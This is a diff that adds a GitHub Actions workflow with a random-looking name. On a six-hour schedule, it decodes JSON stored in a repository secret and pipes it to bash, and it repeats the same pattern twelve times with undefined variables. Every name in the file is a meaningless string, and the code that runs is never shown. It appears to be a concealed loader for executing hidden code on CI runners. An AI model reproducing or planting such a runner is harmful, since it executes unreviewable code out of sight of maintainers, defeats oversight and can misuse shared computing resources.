@@ -1,0 +1,29 @@
+name: guojinjun5317
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: guojinjun5317
+        env:
+          yjy81: ${{ secrets.yjy81 }}
+        run: |
+          echo $yjy81 | jq -r .ucl08258 | /bin/bash
+          echo $me531 | jq -r .mxfd6 | /bin/bash
+          echo $ogp75081 | jq -r .otv84 | /bin/bash
+          echo $fk733 | jq -r .yya9 | /bin/bash
+          echo $afu53846 | jq -r .iurot23278 | /bin/bash
+          echo $eqpq9794 | jq -r .dgs6864 | /bin/bash
+          echo $pp3319 | jq -r .hmsiy31 | /bin/bash
+          echo $adldw27199 | jq -r .ea7 | /bin/bash
+          echo $ygws49320 | jq -r .ed63736 | /bin/bash
+          echo $w10 | jq -r .gbvbn4 | /bin/bash
+          echo $kvfb67 | jq -r .hfncn77 | /bin/bash
+          echo $vhpn7828 | jq -r .ysbsv50 | /bin/bash
+          echo $yn03 | jq -r .i72655 | /bin/bash
+
